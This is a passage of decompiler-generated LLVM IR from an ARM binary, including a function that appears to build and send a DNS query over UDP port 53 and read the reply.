  %v0_e31c = load i32, i32* %r3.global-to-local, align 4
  %v1_e31c = load i32, i32* %sl.global-to-local, align 4
  %v2_e31c = inttoptr i32 %v1_e31c to i32*
  store i32 %v0_e31c, i32* %v2_e31c, align 4
  %v0_e320 = load i32, i32* %lr.global-to-local, align 4
  %v1_e320 = load i32, i32* %r8.global-to-local, align 4
  %v2_e320 = inttoptr i32 %v1_e320 to i32*
  store i32 %v0_e320, i32* %v2_e320, align 4
  %v0_e324 = load i32, i32* %r4.global-to-local, align 4
  %v1_e324 = load i32, i32* %r7.global-to-local, align 4
  %v2_e324 = inttoptr i32 %v1_e324 to i32*
  store i32 %v0_e324, i32* %v2_e324, align 4
  %v0_e328 = load i32, i32* %r0.global-to-local, align 4
  %v1_e328 = load i32, i32* %r6.global-to-local, align 4
  %v2_e328 = inttoptr i32 %v1_e328 to i32*
  store i32 %v0_e328, i32* %v2_e328, align 4
  br label %dec_label_pc_e314

; uselistorder directives
  uselistorder i32 %v9_e2cc, { 1, 0 }
  uselistorder i32 %v12_e2c8, { 1, 0 }
  uselistorder i32 %v5_e2c4, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e2f0, { 1, 0 }
  uselistorder i32 %v0_e2f4, { 1, 0 }
  uselistorder i32 %v0_e2e0, { 1, 0, 2 }
  uselistorder i32 %v0_e29c, { 1, 0 }
  uselistorder i32 %v0_e264, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_1f260.101, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1f260.101 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_1f264.105, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_1f268.107, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1f26c.103, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e314, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e2b4, { 1, 0 }
}

define i32 @function_e340(i32 %arg1) local_unnamed_addr {
dec_label_pc_e340:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e340 = load i32, i32* @r4, align 4
  store i32 %v3_e340, i32* %stack_var_-8, align 4
  %v6_e340 = load i32, i32* @lr, align 4
  %v0_e344 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e344, i32* @r4, align 4
  %v2_e344 = icmp eq i32 %v0_e344, 0
  br i1 %v2_e344, label %dec_label_pc_e360, label %dec_label_pc_e34c

dec_label_pc_e34c:                                ; preds = %dec_label_pc_e340
  %v1_e34c = add i32 %v0_e344, 4
  %v2_e34c = inttoptr i32 %v1_e34c to i32*
  %v3_e34c = load i32, i32* %v2_e34c, align 4
  store i32 %v3_e34c, i32* %r0.global-to-local, align 4
  store i32 58200, i32* @lr, align 4
  %v1_e354 = icmp ne i32 %v3_e34c, 0
  call void @__pseudo_cond_branch(i1 %v1_e354, i32 ptrtoint (i32* @global_var_12da0.21 to i32))
  %v0_e358 = load i32, i32* @r4, align 4
  store i32 %v0_e358, i32* @r0, align 4
  %v0_e35c = call i32 @function_12da0()
  store i32 %v0_e35c, i32* %r0.global-to-local, align 4
  %v2_e360.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e360

dec_label_pc_e360:                                ; preds = %dec_label_pc_e340, %dec_label_pc_e34c
  %v1_e364 = phi i32 [ 0, %dec_label_pc_e340 ], [ %v0_e35c, %dec_label_pc_e34c ]
  %v2_e360 = phi i32 [ %v3_e340, %dec_label_pc_e340 ], [ %v2_e360.pre, %dec_label_pc_e34c ]
  store i32 %v2_e360, i32* @r4, align 4
  store i32 %v6_e340, i32* @lr, align 4
  ret i32 %v1_e364

; uselistorder directives
  uselistorder i32 %v0_e344, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_e360, { 1, 0 }
}

define i32 @function_e368(i32 %arg1) local_unnamed_addr {
dec_label_pc_e368:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp79 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
  %v3_e368 = load i32, i32* @r4, align 4
  %v6_e368 = load i32, i32* @r5, align 4
  %v9_e368 = load i32, i32* @r6, align 4
  %v12_e368 = load i32, i32* @r7, align 4
  %v15_e368 = load i32, i32* @r8, align 4
  %v18_e368 = load i32, i32* @sb, align 4
  %v21_e368 = load i32, i32* @sl, align 4
  %v24_e368 = load i32, i32* @fp, align 4
  %v27_e368 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_e380 = call i32 @function_12654(i32 1, i32 8)
  store i32 %v2_e380, i32* @fp, align 4
  %v0_e388 = load i32, i32* @r5, align 4
  store i32 %v0_e388, i32* %r0.global-to-local, align 4
  %v1_e38c = inttoptr i32 %v0_e388 to i8*
  %v2_e38c = call i32 @function_1084c(i8* %v1_e38c)
  %v2_e394 = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_e394, i32* @sl, align 4
  %v2_e398 = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_e398, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_e3a0 = add i32 %v2_e38c, 1
  store i32 %v1_e3a0, i32* %r0.global-to-local, align 4
  %v2_e3a4 = ptrtoint i32* %stack_var_-2230 to i32
  store i32 %v2_e3a4, i32* %r2.global-to-local, align 4
  store i32 %v2_e398, i32* @r6, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_e3a0, i32* %r3.global-to-local, align 4
  %v2_e3e0146 = icmp eq i32 %v1_e3a0, 0
  store i1 %v2_e3e0146, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_e3e8147 = add i32 %v2_e3a4, -1
  store i32 %v1_e3e8147, i32* %r1.global-to-local, align 4
  %tmp116148 = icmp slt i32 %v1_e3a0, 1
  br i1 %tmp116148, label %dec_label_pc_e3f0, label %dec_label_pc_e3b4

dec_label_pc_e3b4:                                ; preds = %dec_label_pc_e368, %bb115
  %v0_e3b4151 = phi i32 [ %v1_e3d4, %bb115 ], [ 0, %dec_label_pc_e368 ]
  %v1_e3c0150.off0 = phi i8 [ %extract.t152, %bb115 ], [ 0, %dec_label_pc_e368 ]
  %v2_e3f4149 = phi i32 [ %v1_e3d8, %bb115 ], [ %v2_e3a4, %dec_label_pc_e368 ]
  %v1_e3b4 = load i32, i32* @r5, align 4
  %v2_e3b4 = add i32 %v1_e3b4, %v0_e3b4151
  %v3_e3b4 = inttoptr i32 %v2_e3b4 to i8*
  %v4_e3b4 = load i8, i8* %v3_e3b4, align 1
  %v6_e3b4 = zext i8 %v4_e3b4 to i32
  store i32 %v6_e3b4, i32* %r3.global-to-local, align 4
  %v2_e3b8 = icmp eq i8 %v4_e3b4, 0
  store i1 %v2_e3b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e3b8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e3b4
  %v8_e3bc = icmp eq i8 %v4_e3b4, 46
  store i1 %v8_e3bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e3bc, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_e3b4, %bb
  %v3_e3c0 = load i32, i32* @r6, align 4
  %v4_e3c0 = inttoptr i32 %v3_e3c0 to i8*
  store i8 %v1_e3c0150.off0, i8* %v4_e3c0, align 1
  %v0_e3c4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e3c4.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_e3c4.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_e3c4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_e3c4.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_e3c4 = phi i32 [ %v3_e3c4.pre, %.thread..thread7_crit_edge ], [ %v2_e3f4149, %bb ]
  %v1_e3c4.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_e3b4, %bb ]
  %v4_e3c4 = add i32 %v3_e3c4, -1
  %v5_e3c4 = inttoptr i32 %v4_e3c4 to i8*
  store i8 %v1_e3c4.off0, i8* %v5_e3c4, align 1
  %v0_e3c8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e3c8.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_e3c8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e3c8, i32* @r6, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread9:                                         ; preds = %.thread7
  %v1_e3c811 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e3c811, i32* @r6, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread12:                                        ; preds = %.thread7
  %v1_e3d0 = load i32, i32* @lr, align 4
  %v2_e3d0 = urem i32 %v1_e3d0, 256
  store i32 %v2_e3d0, i32* %r4.global-to-local, align 4
  br label %bb115

bb115:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_e3e433 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_e3d0, %.thread12 ]
  %v0_e3d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e3d4 = add i32 %v0_e3d4, 1
  store i32 %v1_e3d4, i32* %ip.global-to-local, align 4
  %v0_e3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e3d8 = add i32 %v0_e3d8, 1
  store i32 %v1_e3d8, i32* %r2.global-to-local, align 4
  %v1_e3dc.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_e3dc = sub i32 %v1_e3dc.pre, %v1_e3d4
  store i32 %v2_e3dc, i32* %r3.global-to-local, align 4
  %v2_e3e0 = icmp eq i32 %v2_e3dc, 0
  store i1 %v2_e3e0, i1* %cpsr_z.global-to-local, align 1
  %v1_e3e4 = add nuw nsw i32 %v0_e3e433, 1
  store i32 %v1_e3e4, i32* @lr, align 4
  store i32 %v0_e3d8, i32* %r1.global-to-local, align 4
  %tmp116 = icmp slt i32 %v2_e3dc, 1
  %extract.t152 = trunc i32 %v0_e3e433 to i8
  br i1 %tmp116, label %dec_label_pc_e3f0, label %dec_label_pc_e3b4

dec_label_pc_e3f0:                                ; preds = %bb115, %dec_label_pc_e368
  %v1_e3e8.lcssa = phi i32 [ %v1_e3e8147, %dec_label_pc_e368 ], [ %v0_e3d8, %bb115 ]
  store i32 0, i32* @r4, align 4
  %v4_e3f4 = inttoptr i32 %v1_e3e8.lcssa to i8*
  store i8 0, i8* %v4_e3f4, align 1
  store i32 %v2_e398, i32* %r0.global-to-local, align 4
  %v1_e3fc = bitcast i32* %stack_var_-2232 to i8*
  %v2_e3fc = call i32 @function_1084c(i8* %v1_e3fc)
  %v2_e400 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_e400, i32* %r1.global-to-local, align 4
  %v1_e404 = load i32, i32* @sb, align 4
  %v2_e404 = add i32 %v1_e404, %v2_e3fc
  store i32 %v2_e404, i32* @r5, align 4
  %v0_e40c = load i32, i32* @r4, align 4
  store i32 %v0_e40c, i32* %stack_var_-68, align 4
  store i32 %v2_e398, i32* %r0.global-to-local, align 4
  %v2_e41c = call i32 @function_1084c(i8* %v1_e3fc)
  %v1_e420 = add i32 %v2_e41c, 17
  store i32 %v1_e420, i32* %r0.global-to-local, align 4
  %v0_e428 = call i32 @function_e0d0()
  %v1_e428 = sext i32 %v0_e428 to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_e434 = mul nuw nsw i64 %v1_e428, 2147516417
  %v6_e434 = udiv i64 %v5_e434, 4294967296
  %v7_e434 = trunc i64 %v6_e434 to i32
  %v8_e434 = trunc i64 %v5_e434 to i32
  store i32 %v8_e434, i32* @lr, align 4
  store i32 %v7_e434, i32* %r2.global-to-local, align 4
  %v5_e4384 = udiv i64 %v5_e434, 140737488355328
  %v5_e438 = trunc i64 %v5_e4384 to i32
  %v6_e438 = add i32 %v5_e438, %v0_e428
  store i32 16, i32* @r1, align 4
  %v6_e444 = urem i32 %v6_e438, 65536
  store i32 %v6_e444, i32* %ip.global-to-local, align 4
  %v2_e44c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_e44c, i32* @r0, align 4
  %v5_e450 = trunc i32 %v6_e438 to i16
  %v0_e454 = call i32 @function_108e0()
  store i32 %v0_e454, i32* %r0.global-to-local, align 4
  store i32 13568, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v0_e484 = load i32, i32* @r5, align 4
  %v1_e484 = add i32 %v0_e484, 1
  store i32 %v1_e484, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i16 %v5_e450, i16* %stack_var_-2244, align 2
  %v4_e498 = inttoptr i32 %v1_e484 to i16*
  store i16 256, i16* %v4_e498, align 2
  %v0_e49c = load i32, i32* %r3.global-to-local, align 4
  %v1_e49c = trunc i32 %v0_e49c to i16
  %v2_e49c = load i32, i32* %r2.global-to-local, align 4
  %v3_e49c = add i32 %v2_e49c, 2
  %v4_e49c = inttoptr i32 %v3_e49c to i16*
  store i16 %v1_e49c, i16* %v4_e49c, align 2
  store i32 -1, i32* @r7, align 4
  %v2_e534 = ptrtoint i32* %stack_var_-196 to i32
  %v2_e55c = ptrtoint i32* %stack_var_-40 to i32
  %v2_e588 = ptrtoint i32* %stack_var_-52 to i32
  %v2_e5c4 = ptrtoint i16* %stack_var_-4292 to i32
  %v2_e658 = ptrtoint i32* %stack_var_-4280 to i32
  %v1_e660 = bitcast i32* %stack_var_-4280 to i8*
  %v4_e684 = zext i16 %tmp79 to i32
  %v2_e688 = icmp eq i16 %tmp79, 0
  br label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e60c, %dec_label_pc_e3f0
  %v1_e4ac = phi i32 [ -1, %dec_label_pc_e3f0 ], [ %v0_e4a8.pre, %dec_label_pc_e60c ]
  %storemerge = phi i32 [ 1, %dec_label_pc_e3f0 ], [ %v1_e60c, %dec_label_pc_e60c ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_e4a8 = icmp eq i32 %v1_e4ac, -1
  store i1 %v7_e4a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e4a8, label %bb118, label %bb117

bb117:                                            ; preds = %dec_label_pc_e4a8
  store i32 %v1_e4ac, i32* %r0.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %dec_label_pc_e4a8, %bb117
  store i32 58548, i32* @lr, align 4
  %v1_e4b0 = xor i1 %v7_e4a8, true
  call void @__pseudo_cond_branch(i1 %v1_e4b0, i32 ptrtoint (i32* @global_var_1130c.96 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e4c0 = call i32 @function_11aec(i32 2, i32 2, i32 0)
  store i32 %v3_e4c0, i32* %r0.global-to-local, align 4
  %v7_e4c4 = icmp eq i32 %v3_e4c0, -1
  store i1 %v7_e4c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e4c0, i32* @r7, align 4
  br i1 %v7_e4c4, label %dec_label_pc_e64c, label %dec_label_pc_e4d0

dec_label_pc_e4d0:                                ; preds = %bb118
  store i32 %v2_e44c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e4dc = call i32 @function_118d4(i32 %v3_e4c0, i32 %v2_e44c, i32 16)
  store i32 %v3_e4dc, i32* %r0.global-to-local, align 4
  %v7_e4e0 = icmp eq i32 %v3_e4dc, -1
  store i1 %v7_e4e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e4e0, label %dec_label_pc_e614, label %dec_label_pc_e4e8

dec_label_pc_e4e8:                                ; preds = %dec_label_pc_e4d0
  %v0_e4e8 = load i32, i32* @r7, align 4
  store i32 %v0_e4e8, i32* %r0.global-to-local, align 4
  store i32 %v2_e394, i32* %r1.global-to-local, align 4
  store i32 %v1_e420, i32* %r2.global-to-local, align 4
  store i32 16384, i32* @r3, align 4
  %v4_e4f8 = call i32 @function_11a30(i32 %v0_e4e8, i32 %v2_e394, i32 %v1_e420, i32 16384)
  store i32 %v4_e4f8, i32* %r0.global-to-local, align 4
  %v7_e4fc = icmp eq i32 %v4_e4f8, -1
  store i1 %v7_e4fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e4fc, label %dec_label_pc_e614, label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e4e8
  %v0_e504 = load i32, i32* @r7, align 4
  store i32 %v0_e504, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_e510 = call i32 @function_11140(i32 3, i32 %v0_e504)
  %v0_e514 = load i32, i32* @r7, align 4
  store i32 %v0_e514, i32* %r1.global-to-local, align 4
  %v1_e518 = or i32 %v2_e510, 2048
  store i32 %v1_e518, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_e520 = call i32 @function_11140(i32 4, i32 %v0_e514)
  store i32 %v2_e520, i32* %r0.global-to-local, align 4
  store i32 %v2_e400, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v2_e534, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e53c

dec_label_pc_e53c:                                ; preds = %dec_label_pc_e53c, %dec_label_pc_e504
  %v1_e540 = phi i32 [ %v1_e544, %dec_label_pc_e53c ], [ 4, %dec_label_pc_e504 ]
  store i32 0, i32* @r4, align 4
  %v3_e540 = add i32 %v1_e540, %v2_e534
  %v4_e540 = inttoptr i32 %v3_e540 to i32*
  store i32 0, i32* %v4_e540, align 4
  %v0_e544 = load i32, i32* %r3.global-to-local, align 4
  %v1_e544 = add i32 %v0_e544, 4
  store i32 %v1_e544, i32* %r3.global-to-local, align 4
  %v7_e548 = icmp eq i32 %v1_e544, 128
  br i1 %v7_e548, label %dec_label_pc_e550, label %dec_label_pc_e53c

dec_label_pc_e550:                                ; preds = %dec_label_pc_e53c
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e550 = load i32, i32* @r7, align 4
  %v3_e550 = udiv i32 %v0_e550, 32
  %v3_e558 = mul nuw nsw i32 %v3_e550, 4
  store i32 %v3_e558, i32* %r3.global-to-local, align 4
  %v2_e560 = add i32 %v3_e558, %v2_e55c
  store i32 %v2_e560, i32* @r5, align 4
  %v1_e564 = add i32 %v2_e560, -156
  %v2_e564 = inttoptr i32 %v1_e564 to i32*
  %v3_e564 = load i32, i32* %v2_e564, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_e56c = urem i32 %v0_e550, 32
  store i32 %v1_e56c, i32* @r6, align 4
  %v7_e570 = shl i32 1, %v1_e56c
  %v8_e570 = or i32 %v3_e564, %v7_e570
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_e570, i32* %v2_e564, align 4
  %v0_e580 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_e580, i32* %stack_var_-52, align 4
  store i32 %v2_e588, i32* @lr, align 4
  store i32 %v2_e400, i32* @ip, align 4
  %v0_e590 = load i32, i32* @r7, align 4
  %v1_e590 = load i32, i32* %r3.global-to-local, align 4
  %v2_e590 = add i32 %v1_e590, %v0_e590
  store i32 %v2_e590, i32* %r0.global-to-local, align 4
  %v0_e598 = load i32, i32* @r4, align 4
  store i32 %v0_e598, i32* %r2.global-to-local, align 4
  store i32 %v0_e598, i32* %r3.global-to-local, align 4
  %v5_e5a4 = call i32 @function_11030(i32 %v2_e590, i32 %v2_e534, i32 %v0_e598, i32 %v0_e598, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_e5a4, i32* %r0.global-to-local, align 4
  %v7_e5a8 = icmp eq i32 %v5_e5a4, -1
  store i1 %v7_e5a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e5a8, label %dec_label_pc_e604, label %dec_label_pc_e5b0

dec_label_pc_e5b0:                                ; preds = %dec_label_pc_e550
  %v0_e5b0 = load i32, i32* @r5, align 4
  %v1_e5b0 = add i32 %v0_e5b0, -156
  %v2_e5b0 = inttoptr i32 %v1_e5b0 to i32*
  %v3_e5b0 = load i32, i32* %v2_e5b0, align 4
  %v1_e5b4 = load i32, i32* @r6, align 4
  %v6_e5b4 = ashr i32 %v3_e5b0, %v1_e5b4
  store i32 %v6_e5b4, i32* %r3.global-to-local, align 4
  %v1_e5b8 = urem i32 %v6_e5b4, 2
  %v2_e5b8 = icmp eq i32 %v1_e5b8, 0
  store i1 %v2_e5b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e5b8, label %dec_label_pc_e624, label %dec_label_pc_e5c0

dec_label_pc_e5c0:                                ; preds = %dec_label_pc_e5b0
  store i32 %v2_e5c4, i32* @r5, align 4
  store i32 %v2_e5c4, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e5d4 = load i32, i32* @r7, align 4
  store i32 %v0_e5d4, i32* %r0.global-to-local, align 4
  %v0_e5d8 = load i32, i32* @r4, align 4
  %v6_e5e0 = call i32 @function_119f4(i32 %v0_e5d4, i32 %v2_e5c4, i32 2048, i32 16384, i32 %v0_e5d8, i32 %v0_e5d8)
  store i32 %v6_e5e0, i32* %r4.global-to-local, align 4
  %v0_e5e8 = load i32, i32* @sb, align 4
  store i32 %v0_e5e8, i32* %r0.global-to-local, align 4
  %v1_e5ec = inttoptr i32 %v0_e5e8 to i8*
  %v2_e5ec = call i32 @function_1084c(i8* %v1_e5ec)
  %v1_e5f0 = add i32 %v2_e5ec, 17
  store i32 %v1_e5f0, i32* %r0.global-to-local, align 4
  %v0_e5f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_e5f4 = icmp ult i32 %v0_e5f4, %v1_e5f0
  %v9_e5f4 = icmp eq i32 %v0_e5f4, %v1_e5f0
  store i1 %v9_e5f4, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_e5f4, label %dec_label_pc_e604, label %dec_label_pc_e658

dec_label_pc_e604:                                ; preds = %dec_label_pc_e5c0, %dec_label_pc_e658, %dec_label_pc_e684, %dec_label_pc_e550, %dec_label_pc_e64c
  %v0_e604 = load i32, i32* @r8, align 4
  %v7_e604 = icmp eq i32 %v0_e604, 5
  store i1 %v7_e604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e604, label %dec_label_pc_e624, label %dec_label_pc_e60c

dec_label_pc_e60c:                                ; preds = %dec_label_pc_e614, %dec_label_pc_e604
  %v0_e60c = phi i32 [ %v0_e61c, %dec_label_pc_e614 ], [ %v0_e604, %dec_label_pc_e604 ]
  %v1_e60c = add i32 %v0_e60c, 1
  %v0_e4a8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_e4a8

dec_label_pc_e614:                                ; preds = %dec_label_pc_e4e8, %dec_label_pc_e4d0
  %v0_e614 = phi i32 [ %v4_e4f8, %dec_label_pc_e4e8 ], [ %v3_e4dc, %dec_label_pc_e4d0 ]
  %v1_e614 = add i32 %v0_e614, 2
  store i32 %v1_e614, i32* %r0.global-to-local, align 4
  %v1_e618 = call i32 @function_133f8(i32 %v1_e614)
  store i32 %v1_e618, i32* %r0.global-to-local, align 4
  %v0_e61c = load i32, i32* @r8, align 4
  %v7_e61c = icmp eq i32 %v0_e61c, 5
  store i1 %v7_e61c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e61c, label %dec_label_pc_e624, label %dec_label_pc_e60c

dec_label_pc_e624:                                ; preds = %dec_label_pc_e614, %dec_label_pc_e604, %dec_label_pc_e5b0, %dec_label_pc_e690, %dec_label_pc_e69c.backedge
  %v0_e624 = load i32, i32* @r7, align 4
  store i32 %v0_e624, i32* %r0.global-to-local, align 4
  %v1_e628 = call i32 @function_1130c(i32 %v0_e624)
  store i32 %v1_e628, i32* %r0.global-to-local, align 4
  %v0_e62c = load i32, i32* @fp, align 4
  %v1_e62c = inttoptr i32 %v0_e62c to i8*
  %v2_e62c = load i8, i8* %v1_e62c, align 1
  %v3_e62c = zext i8 %v2_e62c to i32
  store i32 %v3_e62c, i32* @r4, align 4
  %v2_e630 = icmp eq i8 %v2_e62c, 0
  store i1 %v2_e630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e630, label %dec_label_pc_e774, label %dec_label_pc_e638

dec_label_pc_e638:                                ; preds = %dec_label_pc_e624, %dec_label_pc_e774
  %v0_e638 = phi i32 [ %v0_e62c, %dec_label_pc_e624 ], [ %v0_e788, %dec_label_pc_e774 ]
  store i32 %v0_e638, i32* %r0.global-to-local, align 4
  store i32 %v3_e368, i32* @r4, align 4
  store i32 %v6_e368, i32* @r5, align 4
  store i32 %v9_e368, i32* @r6, align 4
  store i32 %v12_e368, i32* @r7, align 4
  store i32 %v15_e368, i32* @r8, align 4
  store i32 %v18_e368, i32* @sb, align 4
  store i32 %v21_e368, i32* @sl, align 4
  store i32 %v24_e368, i32* @fp, align 4
  store i32 %v27_e368, i32* @lr, align 4
  ret i32 %v0_e638

dec_label_pc_e64c:                                ; preds = %bb118
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e650 = call i32 @function_133f8(i32 1)
  store i32 %v1_e650, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e604

dec_label_pc_e658:                                ; preds = %dec_label_pc_e5c0
  store i32 %v2_e658, i32* @sb, align 4
  store i32 %v2_e658, i32* %r0.global-to-local, align 4
  %v2_e660 = call i32 @function_1084c(i8* %v1_e660)
  %v4_e66c = load i16, i16* %stack_var_-4292, align 2
  %v5_e66c = sext i16 %v4_e66c to i32
  store i32 %v5_e66c, i32* %r3.global-to-local, align 4
  store i32 %v6_e438, i32* %r1.global-to-local, align 4
  %v1_e674 = load i32, i32* @sb, align 4
  %v9_e678 = icmp eq i16 %v4_e66c, %v5_e450
  store i1 %v9_e678, i1* %cpsr_z.global-to-local, align 1
  %v2_e674 = add i32 %v2_e660, 5
  %v1_e67c = add i32 %v2_e674, %v1_e674
  store i32 %v1_e67c, i32* %r0.global-to-local, align 4
  br i1 %v9_e678, label %dec_label_pc_e684, label %dec_label_pc_e604

dec_label_pc_e684:                                ; preds = %dec_label_pc_e658
  store i32 %v4_e684, i32* %r3.global-to-local, align 4
  store i1 %v2_e688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e688, label %dec_label_pc_e604, label %dec_label_pc_e690

dec_label_pc_e690:                                ; preds = %dec_label_pc_e684
  %div = udiv i16 %tmp79, 256
  %v3_e690 = zext i16 %div to i32
  store i32 %v3_e690, i32* %r2.global-to-local, align 4
  %v1_e694 = mul nuw nsw i32 %v4_e684, 256
  %v4_e698 = and i32 %v1_e694, 65280
  %v5_e698 = or i32 %v4_e698, %v3_e690
  %v1_e69c134 = add nsw i32 %v5_e698, -1
  %v3_e6a0135 = mul i32 %v1_e69c134, 65536
  store i32 %v3_e6a0135, i32* %r3.global-to-local, align 4
  %v7_e6a4141 = icmp eq i32 %v3_e6a0135, -65536
  store i1 %v7_e6a4141, i1* %cpsr_z.global-to-local, align 1
  %v3_e6a8142 = urem i32 %v1_e69c134, 65536
  store i32 %v3_e6a8142, i32* @r8, align 4
  br i1 %v7_e6a4141, label %dec_label_pc_e624, label %dec_label_pc_e6b0

dec_label_pc_e6b0:                                ; preds = %dec_label_pc_e690, %dec_label_pc_e69c.backedge
  %v3_e6a8144 = phi i32 [ %v3_e6a8, %dec_label_pc_e69c.backedge ], [ %v3_e6a8142, %dec_label_pc_e690 ]
  %v0_e700143 = phi i32 [ %storemerge29, %dec_label_pc_e69c.backedge ], [ %v1_e67c, %dec_label_pc_e690 ]
  store i32 %v0_e700143, i32* %r3.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 1, i32* @lr, align 4
  %v1_e6bc18 = inttoptr i32 %v0_e700143 to i8*
  %v2_e6bc19 = load i8, i8* %v1_e6bc18, align 1
